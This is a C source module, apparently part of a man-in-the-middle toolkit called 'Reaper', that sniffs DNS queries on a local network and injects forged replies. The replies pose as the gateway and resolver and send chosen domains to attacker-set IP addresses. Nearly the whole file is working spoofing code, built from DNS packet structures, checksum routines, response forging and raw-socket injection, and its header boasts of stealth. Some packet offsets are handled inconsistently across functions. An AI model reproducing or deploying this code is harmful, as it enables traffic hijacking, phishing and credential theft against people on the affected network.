/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER_DNS.C - DNS RESPONSE INJECTION ENGINE
 *  Intercept DNS queries and inject spoofed responses
 *  
 *  Features:
 *  - DNS query detection
 *  - Spoofed response crafting
 *  - Domain → IP redirection
 *  - Wildcard domain matching
 *  - Race condition exploitation (beat real response)
 *  
 *  Zero Dependencies | Full Stealth | Military Grade
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include "reaper_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS PACKET STRUCTURES
 * ═══════════════════════════════════════════════════════════════════════════ */

#pragma pack(push, 1)
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;   // Questions
    uint16_t ancount;   // Answers
    uint16_t nscount;   // Authority
    uint16_t arcount;   // Additional
} dns_header_t;

typedef struct {
    uint16_t qtype;
    uint16_t qclass;
} dns_question_t;

typedef struct {
    uint16_t name;      // Pointer to name (typically 0xC00C)
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    uint32_t rdata;     // IP address for A record
} dns_answer_t;
#pragma pack(pop)

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS DOMAIN ENCODING
 * ═══════════════════════════════════════════════════════════════════════════ */

// Encode domain name to DNS format (e.g., "www.example.com" → "\x03www\x07example\x03com\x00")
static int encode_dns_name(const char* domain, uint8_t* out, int max_len) {
    int out_idx = 0;
    const char* p = domain;
    
    while (*p && out_idx < max_len - 1) {
        // Find next dot or end
        const char* dot = strchr(p, '.');
        int label_len = dot ? (dot - p) : strlen(p);
        
        if (label_len > 63 || out_idx + label_len + 1 >= max_len) {
            return -1;  // Label too long
        }
        
        out[out_idx++] = label_len;
        memcpy(out + out_idx, p, label_len);
        out_idx += label_len;
        
        if (dot) {
            p = dot + 1;
        } else {
            break;
        }
    }
    
    out[out_idx++] = 0;  // Null terminator
    return out_idx;
}

// Decode DNS name from packet
static int decode_dns_name(const uint8_t* packet, int packet_len, int offset, 
                            char* out, int max_len) {
    int out_idx = 0;
    int pos = offset;
    int jumps = 0;
    
    while (pos < packet_len && packet[pos] != 0 && jumps < 10) {
        uint8_t len = packet[pos];
        
        // Check for compression pointer
        if ((len & 0xC0) == 0xC0) {
            if (pos + 1 >= packet_len) return -1;
            int ptr = ((len & 0x3F) << 8) | packet[pos + 1];
            pos = ptr;
            jumps++;
            continue;
        }
        
        pos++;
        if (pos + len > packet_len) return -1;
        
        if (out_idx > 0 && out_idx < max_len - 1) {
            out[out_idx++] = '.';
        }
        
        for (int i = 0; i < len && out_idx < max_len - 1; i++) {
            out[out_idx++] = packet[pos++];
        }
    }
    
    out[out_idx] = '\0';
    return out_idx;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  CHECKSUM CALCULATION
 * ═══════════════════════════════════════════════════════════════════════════ */

static uint16_t checksum(const void* data, int len) {
    const uint16_t* buf = data;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(uint8_t*)buf;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (uint16_t)(~sum);
}

static uint16_t udp_checksum(struct ip* iph, struct udphdr* udph, 
                              const uint8_t* payload, int payload_len) {
    // Pseudo header
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zeros;
        uint8_t proto;
        uint16_t len;
    } pseudo;
    
    pseudo.src = iph->ip_src.s_addr;
    pseudo.dst = iph->ip_dst.s_addr;
    pseudo.zeros = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len = htons(sizeof(struct udphdr) + payload_len);
    
    int total_len = sizeof(pseudo) + sizeof(struct udphdr) + payload_len;
    uint8_t* buf = malloc(total_len);
    if (!buf) return 0;
    
    memcpy(buf, &pseudo, sizeof(pseudo));
    memcpy(buf + sizeof(pseudo), udph, sizeof(struct udphdr));
    memcpy(buf + sizeof(pseudo) + sizeof(struct udphdr), payload, payload_len);
    
    uint16_t cksum = checksum(buf, total_len);
    free(buf);
    
    return cksum;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  BUILD SPOOFED DNS RESPONSE
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_build_dns_response(const captured_packet_t* query,
                               struct in_addr spoofed_ip,
                               uint8_t* response,
                               int max_len,
                               reaper_session_t* session) {
    
    // Parse original DNS query
    const uint8_t* dns_data = query->data;
    int dns_len = query->length - sizeof(struct ether_header) - sizeof(struct ip) - sizeof(struct udphdr);
    
    if (dns_len < (int)sizeof(dns_header_t)) return -1;
    
    dns_header_t* query_hdr = (dns_header_t*)dns_data;
    
    // Build response packet
    int offset = 0;
    
    // Ethernet header
    struct ether_header* eth = (struct ether_header*)response;
    memcpy(eth->ether_dhost, query->src_mac, 6);  // Send to query source
    memcpy(eth->ether_shost, session->gateway_mac, 6);  // Pretend we're gateway
    eth->ether_type = htons(ETHERTYPE_IP);
    offset += sizeof(struct ether_header);
    
    // IP header
    struct ip* iph = (struct ip*)(response + offset);
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_id = htons(rand() & 0xFFFF);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_src = query->dst_ip;  // Response comes from DNS server (gateway)
    iph->ip_dst = query->src_ip;  // Goes to querier
    offset += sizeof(struct ip);
    
    // UDP header
    struct udphdr* udph = (struct udphdr*)(response + offset);
    udph->uh_sport = htons(53);
    udph->uh_dport = htons(query->src_port);
    offset += sizeof(struct udphdr);
    
    // DNS response
    dns_header_t* resp_hdr = (dns_header_t*)(response + offset);
    resp_hdr->id = query_hdr->id;  // Same transaction ID
    resp_hdr->flags = htons(0x8180);  // Standard response, no error
    resp_hdr->qdcount = query_hdr->qdcount;
    resp_hdr->ancount = htons(1);  // One answer
    resp_hdr->nscount = 0;
    resp_hdr->arcount = 0;
    int dns_offset = sizeof(dns_header_t);
    
    // Copy question section from query
    int question_len = dns_len - sizeof(dns_header_t);
    // Find end of question (qname + qtype + qclass)
    const uint8_t* qname = dns_data + sizeof(dns_header_t);
    int qname_len = 0;
    while (qname[qname_len] != 0 && qname_len < question_len) {
        qname_len += qname[qname_len] + 1;
    }
    qname_len++;  // Include null terminator
    qname_len += 4;  // qtype + qclass
    
    memcpy(response + offset + dns_offset, qname, qname_len);
    dns_offset += qname_len;
    
    // Answer section
    dns_answer_t* answer = (dns_answer_t*)(response + offset + dns_offset);
    answer->name = htons(0xC00C);  // Pointer to name in question
    answer->type = htons(1);       // A record
    answer->class = htons(1);      // IN
    answer->ttl = htonl(300);      // 5 minutes
    answer->rdlength = htons(4);   // IPv4 = 4 bytes
    answer->rdata = spoofed_ip.s_addr;
    dns_offset += sizeof(dns_answer_t);
    
    // Set lengths
    int dns_len_total = dns_offset;
    int udp_len = sizeof(struct udphdr) + dns_len_total;
    int ip_len = sizeof(struct ip) + udp_len;
    
    iph->ip_len = htons(ip_len);
    iph->ip_sum = 0;
    iph->ip_sum = checksum(iph, sizeof(struct ip));
    
    udph->uh_ulen = htons(udp_len);
    udph->uh_sum = 0;
    udph->uh_sum = udp_checksum(iph, udph, response + offset, dns_len_total);
    
    return sizeof(struct ether_header) + ip_len;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  CHECK IF DNS QUERY MATCHES SPOOF RULES
 * ═══════════════════════════════════════════════════════════════════════════ */

struct in_addr* reaper_dns_lookup_spoof(reaper_session_t* session, const char* domain) {
    pthread_mutex_lock(&session->dns_config.lock);
    
    for (int i = 0; i < session->dns_config.count; i++) {
        dns_spoof_rule_t* rule = &session->dns_config.rules[i];
        if (rule->enabled && dns_domain_match(rule->domain, domain)) {
            pthread_mutex_unlock(&session->dns_config.lock);
            return &rule->fake_ip;
        }
    }
    
    pthread_mutex_unlock(&session->dns_config.lock);
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  PROCESS DNS PACKET
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_process_dns(reaper_session_t* session, captured_packet_t* pkt) {
    // Only process DNS queries (not responses)
    if (pkt->dst_port != 53) return 0;
    if (!reaper_is_dns_query(pkt->data, pkt->length)) return 0;
    
    // Extract queried domain
    char domain[256];
    // DNS query is after UDP header, domain starts at offset 12 in DNS packet
    const uint8_t* dns_packet = pkt->data;
    int dns_len = pkt->length;
    
    if (decode_dns_name(dns_packet, dns_len, sizeof(dns_header_t), domain, sizeof(domain)) < 0) {
        return -1;
    }
    
    // Check if we should spoof this domain
    struct in_addr* fake_ip = reaper_dns_lookup_spoof(session, domain);
    if (!fake_ip) return 0;  // No spoof rule for this domain
    
    // Build spoofed response
    uint8_t response[1500];
    int resp_len = reaper_build_dns_response(pkt, *fake_ip, response, sizeof(response), session);
    
    if (resp_len < 0) return -2;
    
    // Send spoofed response
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_IP);
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, pkt->src_mac, 6);
    
    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, session->interface, IFNAMSIZ);
    ioctl(session->inject_sock, SIOCGIFINDEX, &ifr);
    sa.sll_ifindex = ifr.ifr_ifindex;
    
    sendto(session->inject_sock, response, resp_len, 0, 
           (struct sockaddr*)&sa, sizeof(sa));
    
    session->dns_spoofed++;
    
    return 1;  // Spoofed
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ADD DNS SPOOF RULE
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_add_dns_rule(reaper_session_t* session, const char* domain, const char* ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1) {
        return -1;
    }
    
    return dns_config_add(&session->dns_config, domain, addr);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS SPOOF THREAD
 * ═══════════════════════════════════════════════════════════════════════════ */

void* reaper_dns_thread(void* arg) {
    reaper_session_t* session = (reaper_session_t*)arg;
    captured_packet_t pkt;
    
    while (session->running) {
        // Get packet from ring buffer
        if (ring_buffer_pop(&session->packet_buffer, &pkt) < 0) {
            usleep(10000);  // 10ms
            continue;
        }
        
        // Process DNS if enabled
        if (session->mode & REAPER_MODE_DNS_SPOOF) {
            if (pkt.protocol == PROTO_DNS) {
                reaper_process_dns(session, &pkt);
            }
        }
    }
    
    return NULL;
}
